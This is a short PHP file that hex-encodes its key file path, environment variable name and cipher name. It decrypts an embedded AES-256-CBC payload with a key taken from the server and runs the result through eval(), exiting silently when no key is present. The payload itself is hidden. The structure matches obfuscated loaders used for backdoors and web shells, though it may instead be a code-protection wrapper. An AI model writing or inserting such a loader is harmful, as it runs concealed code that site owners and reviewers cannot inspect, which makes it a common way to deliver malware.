<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('q6rjsJMSHFCGCYRekjejvw==');

$c=base64_decode(

'C1V4u7nK6EsdkNFwJdOwoTtnjKWF2FMnRm5wAFBJnj2q9Xeyd4x+jmgVMiFDfPGfYJycSKRy9QZP' .
'6lwHZObOWPrca76/WEmFOZ/lZKR7xh1T3R9d3XtLFSNQf3zjMHLMrbhi51zGkC1Q8b7qn1CogVWo' .
'BjAJRRb46ZG+MsAuw/PZxcnBCiItRIytvT+FxFR/mU6otFoG7OmZ+8W+73KM8sVjLzqSy9tjZLW5' .
'PJRR5IsDKS3aAh/PqEN6OySllnejqqXG9jqS6FtOElwrzwZ/wVNCIkDFKXrhauzo/AcsjJq1gEyV' .
'DLs8OJ3plkF59bQvOpkMJJtTl+/qg6WMkSVozOZqbMDIkDsXg4R3MbrRdIaLbo4Ib2Wmh5Yctsd4' .
'yzcEA0O3/MMAOoos2Nwax3vbkGl7xHxWdS6PO3NkxH79EfOGmZn25mgWnRontKWFL447Vm4rBMgh' .
'7xUoM+7Ing5Cxoc/ZZ/MSVf+KOsxqHnXVRz9EMrjrQxckzTHJzmfNVvFdBcHEVS4WE+r4vvXRGaz' .
'J99AkFHKRUBFS1zk4bT0p9YVaR/x+oFmqDF/pzBbUfdopVzNoDfUup+sv8JeIvpcAyHvSCV7r2Ia' .
'VCas44aPryUO/6uUa62TCvlJ6R9EeECUxm9eX08u05yvSHsYbt6FMr2nX9ECozMPbCF9DY4DlU9C' .
'BhgS0hR6/yJddtgkHJ3cBtHV3GPmHLCBod2+x5+iOQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

